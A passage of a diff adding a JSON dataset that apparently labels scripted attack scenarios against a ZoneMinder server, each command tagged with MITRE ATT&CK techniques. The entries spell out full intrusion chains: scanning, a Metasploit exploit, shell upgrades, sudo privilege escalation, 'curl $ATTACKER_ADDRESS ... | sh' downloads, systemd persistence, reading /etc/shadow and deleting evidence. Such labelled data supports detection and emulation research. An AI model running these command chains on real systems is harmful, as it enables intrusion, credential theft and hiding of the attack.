+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_b_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_b_c.j2",
+   "source_sha256": "c0854af9eb757c156564b10079e5b58102c6818325c4a225553d7d0f049d5c16",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "sudo dmesg -H"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "!/bin/bash"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_c_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_c_a.j2",
+   "source_sha256": "0d4abd67392da4e60de4a44bedfce009b715d17b5ccd05852976c10483d70de7",
+   "n_unlabelled_commands": 25,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_c_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_c_b.j2",
+   "source_sha256": "0efcf86ef7874161e807b17de728d1d971c504b5a0ed1d2daf71fa1c40f24f7b",
+   "n_unlabelled_commands": 25,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.3 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_c_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_c_c.j2",
+   "source_sha256": "cc53265f193b387edec72adfed489534f8b2451a1e5c6019feeabeaa3fab39ef",
+   "n_unlabelled_commands": 25,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
+    },
+    {
+     "techniques": [
+      "T1547"
+     ],
+     "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_d_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_d_a.j2",
+   "source_sha256": "ec1f18af97fc81a5f205fa62cec26cb7b8278b15bc523eb124947ea9c6dbc996",
+   "n_unlabelled_commands": 19,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/logrotten"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x logrotten"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /var/www/default"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "echo \"if [ \\`id -u\\` -eq 0 ]; then \\$( {{shellcode3333.stdout}} | sh ); fi\" > payload"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "mkdir log"
+    },
+    {
+     "techniques": [
+      "T1546"
+     ],
+     "tactics": [
+      "Privilege Escalation",
+      "Persistence"
+     ],
+     "type": "msf-session",
